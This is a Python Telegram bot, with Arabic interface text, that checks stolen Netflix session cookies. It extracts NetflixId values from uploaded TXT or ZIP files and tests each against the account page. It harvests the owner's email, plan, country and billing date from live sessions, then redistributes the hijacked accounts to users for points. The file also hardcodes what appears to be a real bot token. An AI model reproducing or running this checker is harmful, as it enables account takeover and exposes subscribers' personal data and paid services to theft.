import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit & Channel info
OWNER_CREDIT = "Faris - https://t.me/farxxess"
CHANNEL_LINK = "https://t.me/farxxess"

# إعدادات بوت التليجرام
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
bot = telebot.TeleBot(BOT_TOKEN)

# 👑 إعدادات المطور الخاصة بك (فارس)
DEVELOPER_ID = 8713916851

STOCK_FILE = "stock_accounts.txt"
USERS_FILE = "users_data.json"

active_scans = {}

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_users(users_data):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users_data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def add_user_if_not_exists(user_id):
    users = load_users()
    str_id = str(user_id)
    if str_id not in users:
        users[str_id] = {"points": 3, "joined_date": datetime.now().strftime('%Y-%m-%d')}
        save_users(users)

def save_to_stock(account_text):
    try:
        with open(STOCK_FILE, "a", encoding="utf-8") as f:
            f.write(account_text + "\n" + "="*40 + "\n")
    except Exception as e:
        logger.error(f"Error saving to stock: {e}")

def get_random_account_from_stock():
    if not os.path.exists(STOCK_FILE):
        return None
    try:
        with open(STOCK_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
        if not content:
            return None
        
        accounts = content.split("="*40)
        accounts = [acc.strip() for acc in accounts if acc.strip()]
        
        if not accounts:
            return None
            
        chosen_acc = random.choice(accounts)
        remaining_accounts = [acc for acc in accounts if acc != chosen_acc]
        with open(STOCK_FILE, "w", encoding="utf-8") as f:
            f.write(("\n" + "="*40 + "\n").join(remaining_accounts) + ("\n" + "="*40 + "\n" if remaining_accounts else ""))
            
        return chosen_acc
    except Exception as e:
        logger.error(f"Error getting account from stock: {e}")
        return None

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_next_billing_date(response_text):
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False}
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = unescape_plan(find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"') or "Unknown")
        plan_price = unescape_plan(find(r'"planPrice"[^}]+"value":"([^"]+)"') or "Unknown")
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email != "Unknown":
            email = urllib.parse.unquote(email)
        next_billing = extract_next_billing_date(txt)

        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
        profiles_str = ", ".join(list(set(profiles))) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')

        return {
            'ok': is_valid,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'email': email,
            'profiles': profiles_str,
            'next_billing': format_billing_date(next_billing),
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except:
        return []

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    add_user_if_not_exists(user_id)
    
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
        InlineKeyboardButton("🎁 سحب حساب من الذاكرة (1 نقطة)", callback_data="btn_stock"),
        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance"),
        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
    )
    
    if user_id == DEVELOPER_ID:
        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
        
    welcome_text = "🎬 **مرحباً بك في بوت فحص نتفليكس الإحترافي**\n👑 *المطور:* [فارس](https://t.me/farxxess)\n\nاختر أحد الخيارات أدناه للبدء:"
    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    users = load_users()
    str_id = str(user_id)
    
    if call.data == "btn_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📂 **أرسل الآن ملف الكوكيز بصيغة `.txt` أو `.zip` وسأبدأ الفحص الفوري مع شاشة التقدم!**", parse_mode='Markdown')
        
    elif call.data == "btn_balance":
        points = users.get(str_id, {}).get("points", 0)
        bot.answer_callback_query(call.id, text=f"رصيدك الحالي هو: {points} نقطة", show_alert=True)
        
    elif call.data == "btn_stock":
        bot.answer_callback_query(call.id)
        current_points = users.get(str_id, {}).get("points", 0)
        
        if current_points < 1:
            bot.send_message(call.message.chat.id, "❌ رصيدك غير كافٍ! تحتاج إلى نقطة واحدة (1) لسحب حساب من الذاكرة.")
            return
            
        account = get_random_account_from_stock()
        if account:
            users[str_id]["points"] -= 1
            save_users(users)
            
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("💻 Netflix Login", url="https://www.netflix.com/login"),
                InlineKeyboardButton("📱 Open Netflix", url="https://www.netflix.com")
            )
            
            watermarked_acc = f"{account}\n\n👑 *Dev:* @farxxess | [Channel](https://t.me/farxxess)"
            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{watermarked_acc}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown', reply_markup=markup)
        else:
            bot.send_message(call.message.chat.id, "⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!")
            
    elif call.data == "btn_admin":
        if user_id != DEVELOPER_ID:
            bot.answer_callback_query(call.id, text="هذا الخيار خاص بالمطور فارس فقط!", show_alert=True)
            return
            
        bot.answer_callback_query(call.id)
        total_users = len(users)
        stock_count = 0
        if os.path.exists(STOCK_FILE):
            with open(STOCK_FILE, "r", encoding="utf-8") as f:
                stock_count = f.read().count("="*40)
                
        admin_text = (
            "⚙️ **لوحة تحكم المطور (فارس)**\n\n"
            f"👥 إجمالي المستخدمين: `{total_users}`\n"
            f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n\n"
            "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
            "`/addpoints [ID] [العدد]`"
        )
        bot.send_message(call.message.chat.id, admin_text, parse_mode='Markdown')
        
    elif call.data.startswith("stop_scan_"):
        scan_id = call.data.replace("stop_scan_", "")
        if scan_id in active_scans:
            active_scans[scan_id] = True
            bot.answer_callback_query(call.id, text="⏹️ تم طلب إيقاف الفحص بنجاح!", show_alert=True)

@bot.message_handler(commands=['addpoints'])
def add_points_command(message):
    if message.from_user.id != DEVELOPER_ID:
        return
        
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ الاستخدام الخاطئ للأمر. استخدم:\n`/addpoints [ID] [العدد]`", parse_mode='Markdown')
        return
        
    target_id = parts[1]
    try:
        amount = int(parts[2])
    except:
        bot.reply_to(message, "❌ عدد النقاط يجب أن يكون رقماً صحيحاً.")
        return
        
    users = load_users()
    if target_id in users:
        users[target_id]["points"] += amount
        save_users(users)
        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.\n💰 رصيده الحالي: {users[target_id]['points']} نقطة", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد.")

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    user_id = message.from_user.id
    add_user_if_not_exists(user_id)
    
    temp_dirs = []
    scan_id = str(uuid.uuid4())
    active_scans[scan_id] = False
    
    try:
        stop_markup = InlineKeyboardMarkup()
        stop_markup.add(InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data=f"stop_scan_{scan_id}"))
        
        status_msg = bot.send_message(message.chat.id, "⏳ **جاري تحضير الملف وبدء الفحص الإحترافي...**\n📊 التقدم: `0%`", parse_mode='Markdown', reply_markup=stop_markup)
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = message.document.file_name
        unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
        temp_dirs.append(unique_dir)
        
        file_path = os.path.join(unique_dir, filename)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        txt_files_to_check = []
        if filename.lower().endswith('.zip'):
            txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
        elif filename.lower().endswith('.txt'):
            txt_files_to_check = [file_path]
            
        if not txt_files_to_check:
            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, status_msg.message_id)
            return
            
        all_lines = []
        for txt_file in txt_files_to_check:
            try:
                with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                    all_lines.extend(f.readlines())
            except:
                pass
                
        total_lines = len(all_lines)
        if total_lines == 0:
            bot.edit_message_text("❌ الملف فارغ تماماً.", message.chat.id, status_msg.message_id)
            return

        valid_count = 0
        processed_count = 0
        result_file_path = os.path.join(unique_dir, "the_premuim_account.txt")
        
        with open(result_file_path, "w", encoding="utf-8") as res_file:
            for line in all_lines:
                if active_scans.get(scan_id, False):
                    bot.edit_message_text("⏹️ **تم إيقاف عملية الفحص بنجاح بناءً على طلبك.**", message.chat.id, status_msg.message_id)
                    break
                    
                processed_count += 1
                line = line.strip()
                if not line:
                    continue
                    
                if processed_count % 5 == 0 or processed_count == total_lines:
                    percent = int((processed_count / total_lines) * 100)
                    try:
                        bot.edit_message_text(
                            f"🔍 **جاري فحص الحسابات الآن...**\n📊 النسبة المئوية: `{percent}%` ({processed_count}/{total_lines})\n✅ الحسابات الفعالة: `{valid_count}`",
                            message.chat.id, status_msg.message_id, parse_mode='Markdown', reply_markup=stop_markup
                        )
                    except:
                        pass
                        
                netflix_id = extract_netflix_id(line)
                if not netflix_id:
                    continue
                    
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                    valid_count += 1
                    
                    res_msg = "🎬 **حساب NETFLIX صالح وفعال** 🎬\n\n"
                    res_msg += f"🌍 البلد: `{account_info['country']}`\n"
                    res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
                    res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
                    res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
                    res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
                    res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                    res_msg += f"🔑 **NetflixId Cookie:**\n`{netflix_id}`\n"
                    
                    markup = InlineKeyboardMarkup()
                    markup.add(
                        InlineKeyboardButton("💻 Netflix Login", url="https://www.netflix.com/login"),
                        InlineKeyboardButton("📱 Open Netflix", url="https://www.netflix.com")
                    )
                        
                    res_msg += f"\n👑 *Dev:* @farxxess | [Channel](https://t.me/farxxess)"
                    
                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup)
                    
                    res_file.write(res_msg.replace('`', '').replace('*', '') + "\n" + "="*40 + "\n")
                    save_to_stock(res_msg.replace('`', '').replace('*', ''))
                    time.sleep(0.5)
                    
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
            
        if valid_count > 0 and os.path.exists(result_file_path):
            with open(result_file_path, "rb") as rf:
                bot.send_document(message.chat.id, rf, caption=f"📁 **ملف النتائج الشامل:** `the_premuim_account.txt`\n👑 *By Faris* (@farxxess)", parse_mode='Markdown')
                
        bot.send_message(message.chat.id, f"✅ **انتهى الفحص بنجاح!**\n📊 إجمالي الحسابات الفعالة المكتشفة: `{valid_count}` حساب.\n👑 *Channel:* {CHANNEL_LINK}", parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ أثناء المعالجة: {str(e)}")
    finally:
        if scan_id in active_scans:
            del active_scans[scan_id]
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

if __name__ == '__main__':
    logger.info("Telegram Bot is running for Faris with direct cookie value output...")
    bot.infinity_polling()
